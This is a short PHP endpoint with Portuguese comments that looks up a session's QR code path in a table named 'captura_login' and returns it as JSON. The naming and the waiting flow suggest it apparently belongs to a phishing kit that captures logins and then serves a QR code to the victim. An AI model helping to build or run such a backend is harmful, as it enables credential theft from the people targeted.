<?php
// api_get_qrcode.php
header('Content-Type: application/json');

require 'db.php';

// Se o cliente não tem o cookie de sessão, não há como encontrar seu QR Code.
if (!isset($_COOKIE['identificador_cliente'])) {
    echo json_encode(['success' => false, 'error' => 'Sessão não encontrada.']);
    exit;
}

$session_id = $_COOKIE['identificador_cliente'];

try {
    // Busca o caminho do QR Code para a entrada mais recente desta sessão
    $stmt = $pdo->prepare(
        "SELECT qrcode_path FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
    );
    $stmt->execute([$session_id]);
    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

    // Se encontrou um registro e o caminho do QR Code não está vazio...
    if ($resultado && !empty($resultado['qrcode_path'])) {
        // ...retorna sucesso e o caminho para a imagem.
        echo json_encode(['success' => true, 'qrcode_path' => $resultado['qrcode_path']]);
    } else {
        // ...caso contrário, informa que ainda está aguardando.
        echo json_encode(['success' => false, 'error' => 'Aguardando QR Code.']);
    }

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Erro de banco de dados: ' . $e->getMessage()]);
}
?>